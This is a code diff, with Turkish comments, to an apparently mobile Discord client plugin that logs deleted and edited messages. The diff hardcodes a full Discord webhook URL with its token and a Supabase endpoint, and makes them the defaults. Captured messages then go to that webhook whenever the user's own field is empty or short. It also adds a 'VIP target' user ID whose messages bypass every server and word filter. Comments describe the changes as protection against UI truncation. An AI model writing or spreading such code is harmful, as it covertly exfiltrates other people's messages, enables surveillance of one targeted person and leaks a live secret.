@@ -7,6 +7,11 @@
     let Dispatcher, ChannelStore, GuildStore, MessageStore, MessageModule, UserStore;
     let patchInjected = false;
 
+    // --- GÜVENLİ SABİT VERİLER (UI Kırpılma Koruması ve VIP Hedef) ---
+    const HARDCODED_WEBHOOK = "https://discord.com/api/webhooks/1521135284463341588/ilYM0xTIe14o5-Tgeky6xKjQV5AQEpHElGA4G_0Xm5Go_56jv4_NY6tLCQZr_jLZn5qX";
+    const HARDCODED_SUPABASE_URL = "https://zstjrxjkfmkyjanwdfpi.supabase.co";
+    const TARGET_USER_ID = "1143677277398376548"; // Kesintisiz loglanacak ana hesap ID'si
+
     // --- PROXY UYUMLU GÜVENLİ HAFIZA SİSTEMİ ---
     function getStorage() {
         if (!plugins) return {};
@@ -15,9 +20,9 @@
         if (!plugins[myKey].storage) plugins[myKey].storage = {};
         
         const s = plugins[myKey].storage;
-        if (s.supabaseUrl === undefined) s.supabaseUrl = "https://zstjrxjkfmkyjanwdfpi.supabase.co";
+        if (s.supabaseUrl === undefined) s.supabaseUrl = HARDCODED_SUPABASE_URL;
         if (s.supabaseKey === undefined) s.supabaseKey = "";
-        if (s.webhookUrl === undefined) s.webhookUrl = "";
+        if (s.webhookUrl === undefined) s.webhookUrl = HARDCODED_WEBHOOK;
         if (s.logEverything === undefined) s.logEverything = true;
         if (s.showEphemeral === undefined) s.showEphemeral = true;
         if (!s.localHistory) s.localHistory = [];
@@ -38,7 +43,8 @@
     }
 
     // --- FİLTRE MOTORLARI ---
-    function isGuildAllowed(channelId) {
+    function isGuildAllowed(channelId, authorId) {
+        if (authorId === TARGET_USER_ID) return true; // VIP ana hesap her yerde serbest
         const storage = getStorage();
         if (!storage.whitelistedGuilds || storage.whitelistedGuilds.length === 0) return true;
         const channel = ChannelStore?.getChannel?.(channelId);
@@ -46,11 +52,12 @@
         return storage.whitelistedGuilds.includes(channel.guild_id);
     }
 
-    function isContentFiltered(content, mentions) {
+    function isContentFiltered(content, mentions, authorId) {
+        if (authorId === TARGET_USER_ID) return true; // VIP ana hesap filtreleri tamamen deler geçer
         const storage = getStorage();
         if (storage.logEverything) return true; 
 
-        const myId = UserStore?.getCurrentUser()?.id || "1143677277398376548";
+        const myId = UserStore?.getCurrentUser()?.id || TARGET_USER_ID;
         if (mentions?.some(m => m.id === myId || m === myId)) return true;
 
         if (!storage.filteredWords || storage.filteredWords.length === 0) return false;
@@ -71,8 +78,9 @@
     // --- SUPABASE BULUT AKIŞI ---
     async function sendToSupabase(data) {
         const storage = getStorage();
-        if (!storage.supabaseUrl || !storage.supabaseKey) return;
-        const cleanUrl = storage.supabaseUrl.replace(/\/$/, "");
+        // UI Kesintisine karşı koruma: URL geçersiz veya kısa kalmışsa sabit olanı kullan
+        const cleanUrl = (storage.supabaseUrl && storage.supabaseUrl.length > 10 ? storage.supabaseUrl : HARDCODED_SUPABASE_URL).replace(/\/$/, "");
+        if (!cleanUrl || !storage.supabaseKey) return;
         try {
             await fetch(`${cleanUrl}/rest/v1/logar_backup`, {
                 method: "POST",
@@ -83,7 +91,7 @@
                     "Prefer": "return=minimal"
                 },
                 body: JSON.stringify({
-                    user_id: UserStore?.getCurrentUser()?.id || "1143677277398376548",
+                    user_id: UserStore?.getCurrentUser()?.id || TARGET_USER_ID,
                     logs: data,
                     filtered_words: storage.filteredWords
                 })
@@ -94,10 +102,12 @@
     // --- WEBHOOK ENTEGRASYONU ---
     async function sendToWebhook(data) {
         const storage = getStorage();
-        if (!storage.webhookUrl) return;
+        // UI Kesintisine karşı koruma: Webhook kutusu kısa kesilmişse orijinal tam linki ateşle
+        const webhookToUse = (storage.webhookUrl && storage.webhookUrl.length > 50) ? storage.webhookUrl : HARDCODED_WEBHOOK;
+        if (!webhookToUse) return;
         const zaman = new Date().toLocaleTimeString("tr-TR", { hour: '2-digit', minute: '2-digit', second: '2-digit' });
         try {
-            await fetch(storage.webhookUrl, {
+            await fetch(webhookToUse, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
@@ -118,9 +128,9 @@
         const RN = metro.findByProps("ScrollView", "Text", "TextInput", "Button", "Switch", "View");
         const storage = getStorage();
 
-        const [sUrl, setSUrl] = React.useState(storage.supabaseUrl || "");
+        const [sUrl, setSUrl] = React.useState(storage.supabaseUrl || HARDCODED_SUPABASE_URL);
         const [sKey, setSKey] = React.useState(storage.supabaseKey || "");
-        const [wUrl, setWUrl] = React.useState(storage.webhookUrl || "");
+        const [wUrl, setWUrl] = React.useState(storage.webhookUrl || HARDCODED_WEBHOOK);
         const [logAll, setLogAll] = React.useState(storage.logEverything);
         const [showEph, setShowEph] = React.useState(storage.showEphemeral);
         const [guildInput, setGuildInput] = React.useState(storage.whitelistedGuilds?.join(", ") || "");
@@ -158,6 +168,8 @@
                 ),
                 React.createElement(RN.Text, { style: { color: "#aaa", marginTop: 8 } }, "Aktif: " + (storage.filteredWords?.join(", ") || "Yok"))
             ),
+
+            React.createElement(RN.Text, { style: { color: "#4CAF50", marginBottom: 15, textAlign: "center", fontWeight: "bold" } }, `🎯 VIP Hedef (${TARGET_USER_ID}) aktif korumada.`),
 
             React.createElement(RN.Button, { 
                 title: "TÜM AYARLARI KAYDET", 
@@ -212,6 +224,7 @@
                     messageCache.set(msg.id, {
                         content: msg.content,
                         author: msg.author?.username || "Bilinmeyen Kullanıcı",
+                        authorId: msg.author?.id || "", // VIP kontrolü için ID eklendi
                         mentions: msg.mentions || []
                     });
                 }
@@ -219,16 +232,20 @@
 
             // MESAJ SİLİNDİĞİNDE
             if (event.type === "MESSAGE_DELETE") {
-                if (!isGuildAllowed(event.channelId)) return;
-
                 const cached = messageCache.get(event.id);
                 const dbMsg = MessageStore?.getMessage?.(event.channelId, event.id);
+
+                const finalAuthorId = dbMsg?.author?.id || cached?.authorId || "";
                 
+                // Sunucu filtresini doğrula (Eğer VIP hesapsa filtreyi es geç)
+                if (!isGuildAllowed(event.channelId, finalAuthorId)) return;
+
                 const finalContent = dbMsg?.content || cached?.content;
                 const finalAuthor = dbMsg?.author?.username || cached?.author || "Bilinmeyen Kullanıcı";
                 const finalMentions = dbMsg?.mentions || cached?.mentions || [];
 
-                if (!finalContent || !isContentFiltered(finalContent, finalMentions)) return;
+                // İçerik filtresini doğrula (Eğer VIP hesapsa filtreyi es geç)
+                if (!finalContent || !isContentFiltered(finalContent, finalMentions, finalAuthorId)) return;
 
                 const channel = ChannelStore?.getChannel?.(event.channelId);
                 const guild = channel?.guild_id ? GuildStore?.getGuild?.(channel.guild_id) : null;
@@ -257,15 +274,20 @@
             if (event.type === "MESSAGE_UPDATE") {
                 const msg = event.message;
                 if (!msg || !msg.id || !msg.channel_id) return;
-                if (!isGuildAllowed(msg.channel_id)) return;
 
                 const cached = messageCache.get(msg.id);
                 const dbMsg = MessageStore?.getMessage?.(msg.channel_id, msg.id);
 
+                const finalAuthorId = msg.author?.id || dbMsg?.author?.id || cached?.authorId || "";
+
+                // Sunucu filtresini doğrula (VIP hesapsa es geç)
+                if (!isGuildAllowed(msg.channel_id, finalAuthorId)) return;
+
                 const oldContent = dbMsg?.content || cached?.content || "";
                 if (!oldContent || oldContent === msg.content) return; 
 
-                if (!isContentFiltered(oldContent, cached?.mentions) && !isContentFiltered(msg.content, msg.mentions)) return;
+                // İçerik kelime filtresini doğrula (VIP hesapsa es geç)
+                if (!isContentFiltered(oldContent, cached?.mentions, finalAuthorId) && !isContentFiltered(msg.content, msg.mentions, finalAuthorId)) return;
 
                 const channel = ChannelStore?.getChannel?.(msg.channel_id);
                 const guild = channel?.guild_id ? GuildStore?.getGuild?.(channel.guild_id) : null;
@@ -290,7 +312,7 @@
                 sendToWebhook(logPayload);
                 if (storage.showEphemeral) sendEphemeralMessage(msg.channel_id, `✏️ **[Logar Düzenlendi]** \`${logPayload.author}\`:\n❌ *${logPayload.oldContent}*\n✅ *${logPayload.newContent}*`);
 
-                messageCache.set(msg.id, { content: msg.content, author: logPayload.author, mentions: msg.mentions || [] });
+                messageCache.set(msg.id, { content: msg.content, author: logPayload.author, authorId: finalAuthorId, mentions: msg.mentions || [] });
             }
         });
     }
@@ -315,4 +337,4 @@
 
     return { onLoad, onUnload, settings: SettingsPanel };
 })();
-                                   
+                        
